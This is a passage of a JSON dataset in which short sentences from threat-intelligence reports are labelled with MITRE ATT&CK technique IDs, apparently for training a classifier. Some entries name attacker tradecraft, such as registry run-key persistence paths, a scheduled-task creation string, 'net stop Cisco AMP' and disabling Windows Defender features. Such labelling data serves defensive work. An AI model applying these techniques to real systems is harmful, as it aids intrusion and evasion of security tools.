    "text": "has the ability to search for a given process name in processes currently running in the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 including sending error codes in Cookie headers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional malware plug-in modules and execute them on the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This function obtains the username,",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "creates a scheduled task on the system that provides persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has conducted C2 over HTTP and HTTPS.(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls May 2020)(Citation: McAfee Lazarus Jul 2020)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the win32 function CreateServiceA was used by the malware",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `dir c:\\\\` to search for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Remote Task Creation/Update using Schtasks Process",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "stealing multiple types of data",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collected the victim's username and executed the whoami command on the victim's machine.  executed shellcode to collect the username on the victim's machine. (Citation: FireEye APT32 April 2020)(Citation: ESET OceanLotus)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can use rundll32 for execution on compromised hosts.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username from the victims machine.(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: Fortinet Agent Tesla April 2018)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download and execute an additional file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has executed C2 commands directly via HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use cmd.exe for command execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has a tool that can run DLLs.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has run `whoami` on compromised machines to identify the current user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can issue commands using cmd.exe.(Citation: Red Canary NETWIRE January 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can persist by setting Registry key values HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP to communicate with C2 servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "will identify Microsoft Office documents on the victim's computer.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use the ps command to discover other cryptocurrency miners active on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "the team compromised a domain admin account and used it to laterally to multiple workstations and the DC.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool to open a Windows Command Shell on a remote host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has laterally moved using RDP connections. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "to download another remote file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LSASS dump in the WebDAV detected",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate the infected system's user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional tools and malware onto compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has uploaded files and information from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "obtains all entries within the IPs starting with 192., 10., and .172 in the ARP cache table",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can gather the computer name of an infected host.(Citation: Mandiant UNC3313 Feb 2022)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded files onto a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses a custom network protocol, which can function over HTTP",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect IP addresses and local intranet information from a victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "whoami",
    "command": "",
    "labels": [
      "T1016",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `cmd.exe` to execute commands and run malicious binaries.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool to capture the processor architecture of a compromised host in order to register it with C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "shows the three registry keys used",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "If establishing persistence by installation as a new service fails one variant of  establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry keys for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self] and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD.(Citation: Lotus Blossom Jun 2015)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "is capable of deleting Registry keys sub-keys and values on a victim system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can utilize command line options to allow an attacker control over how it scans and encrypts files.(Citation: CarbonBlack Conti July 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional scripts tools and malware onto victim systems.(Citation: Crowdstrike GTR2020 Mar 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can identify the user name on a compromised system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.(Citation: Symantec Elderwood Sept 2012)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "include exfiltrating system information",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can launch a remote shell to execute commands on the victims machine.(Citation: GitHub QuasarRAT)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used  to obtain credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "downloads an HTTP server to the infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use GET.WORKSPACE in Microsoft Excel to determine the OS version of the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has a command to gather the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can write data to `HKLM\\Software\\NFC\\IPA` and `HKLM\\Software\\NFC\\` and delete Registry values.(Citation: DHS CISA AA22-055A MuddyWater February 2022)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "may collect information about the currently logged in user by running whoami on a victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gather metadata from a file and to search for file and directory names.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used  to establish full remote control of the connected machine and manipulate the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "directory listings were harvested as a result.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can uninstall itself.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "with a tool called nanodump, exported the output, and processed the output offline with Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "uses  and  to download additional malware. (Citation: Cofense Astaroth Sept 2018)(Citation: Cybereason Astaroth Feb 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to return a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "then the payload is executed using Windows API functions (VirtualProtect).",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "contains a command to retrieve files from its C2 server.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users,",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete files from a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files to the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "runs ipconfig /all and collects the domain name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "and the built-in Windows user account  [T1078.001] to move laterally",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional modules to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Persistence is maintained through a Run registry key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can download an executable to run on the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to run cmd.exe to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "threat actors using this tool are very quick to update their lures and find ways to entice their victims into installing the malicious remote control software.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can determine the public or WAN IP address for the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the username is also sent to the C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded PowerShell code from the C2 server to be executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use Windows API functions to inject the ransomware DLL.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by adding itself as a new service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "uploads files and secondary payloads to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "had to receive an HTTP GET request containing a specific set of parameters in order to execute.(Citation: Guidepoint SUPERNOVA Dec 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "injects into the Internet Explorer process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "used different compromised credentials for remote access and to move laterally.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "writing the batch file to disk and executing.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The dropped files are either in the root of the “ProgramData” folder or in a subdirectory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect drive and file information on an infected machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username from the system. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "using three possible types of messages to try to get a target to open the email and malicious attachment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "it creates a scheduled task that runs the Rust executable by passing it as an argument to rhc.exe.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "to gather basic system information, including username,",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The communications module then downloads the main backdoor module,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has executed  to harvest stored credentials from the victim and further victim penetration.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can self delete its dropper after the malware is successfully deployed.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the HTTP C2 Communication section.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the IP address of a victim machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used  to query the Registry for installed programs.(Citation: TrendMicro Ursnif Mar 2015)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can add a service called WBService to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "the accounts that were used to authenticate to the cloud.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "routinely deleted tools logs and other files after they were finished with them.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "deletes its rootkit’s executable after launching it.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "collects the account name of the logged-in user and sends it to the C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": " net config",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "used a backdoor to enumerate information about the infected system's operating system.(Citation: ESET Telebots July 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used e-mails with malicious documents to lure victims into installing malware.(Citation: TrendMicro BlackTech June 2017) ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "host,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It creates directory listings",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI for execution on a compromised host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "KEYS Deletes the file named by tempPath + “ky” file so as not to upload anything",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files and tools from its C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "makes use of API GetTickCount / QueryPerformanceCounter",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the Windows version on the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has delivered macro-enabled documents that required targets to click the enable content button to execute the payload on the system.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Crowdstrike Helix Kitten Nov 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used several Windows API functions throughout the encryption process including IsDebuggerPresent TerminateProcess Process32FirstW among others.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has staged collected data in a central upload directory prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "first-stage downloader installed  to the startup folder %Startup%\\mssync.exe.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "actors use  to discover vulnerable systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate and examine running processes to determine if a debugger is present.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can modify registry entries.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has executed downloaded DLLs with rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "routinely removed their tools including custom backdoors once remote access was achieved.  has also used  to remove artifacts from victims.(Citation: FireEye SUNBURST Backdoor December 2020)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "An  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "runs cmd.exe /c and sends the output to its C2.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by creating a Registry run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has altered the InstallTime subkey.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "and Remote Desktop user sessions.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The C# implementation of the  command execution module can use cmd.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject DLLs into specific processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "it can create a service or scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created buffer",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "is capable of launching a remote shell on the host to delete itself.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to create a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "silently executes received commands with cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "team attempted to determine valid accounts based on group name and purpose",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can disable Security Center functions like anti-virus.(Citation: TrendMicro DarkComet Sept 2014)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that can collect the victims username.(Citation: Securelist MuddyWater Oct 2018)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "utilizes scheduled tasks as a persistence mechanism.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors can use windows binaries and commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "may collect network configuration data by running ipconfig /all on a victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Below is an example of the service edc603a that was created",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "RDP was also used by the threat actor",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Tool Used to Steal Sensitive Information",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has a module for  to collect Windows credentials from the victims machine.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "File enumeration",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "collected data from the victim's local system including password hashes from the SAM hive in the Registry.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to delete files after they are deployed on a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has captured victim computer name memory space and CPU details.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The operators deleted tools used for credential harvesting and\ninternal reconnaissance",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "supports HTTP-based C2 profiles.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can determine the domain of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Registry key “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ” is queried to check the values ConsentPromptBehaviorAdmin and PromptOnSecureDesktop",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files by using a variety of functions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure victims into opening e-mail attachments to execute malicious code.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has spawned a new cmd.exe process to execute commands. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "operators attempted to capture cached credentials and then use them for lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can identify the process for a specific security product.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can execute shell commands using cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "a process where the threat actors injected:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the command \"net stop Cisco AMP\".",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors established persistence through a scheduled task using the command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR` named WinUpdate ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "lists files in directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can create a remote shell and run a given command.(Citation: ESET Sednit Part 2)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "and hostnames collected",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The email address is associated with the Lebanese domain of a major global financial institution",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised credentials to access cloud assets within a target organization.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "uploads, downloads a file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP for C2 communications.(Citation: FireEye APT34 Dec 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster Tools). ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can download remote files.(Citation: Trend Micro Daserf Nov 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can scan directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can run commands that will download files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Disables the following Windows Defender features:Intrusion Prevention System\nIO AV Protection (does not scan downloaded files and attachments)\nRealtime monitoring\nScript scanning\nControlled folder access protection\nPUA protection\nScheduled scan",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers the IP address and domain from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "then deletes the registry key",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "malware IndiaIndia obtains and sends to its C2 server information about the first network interface cards configuration including IP address gateways subnet mask DHCP information and whether WINS is available.(Citation: Novetta Blockbuster)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Using cmd.exe,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "beacon payload can collect information on process details.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has collected data from victims' local systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "HTTP POST request used for FlowCloud C&C communication",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised credentials to access other systems on a victim network.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
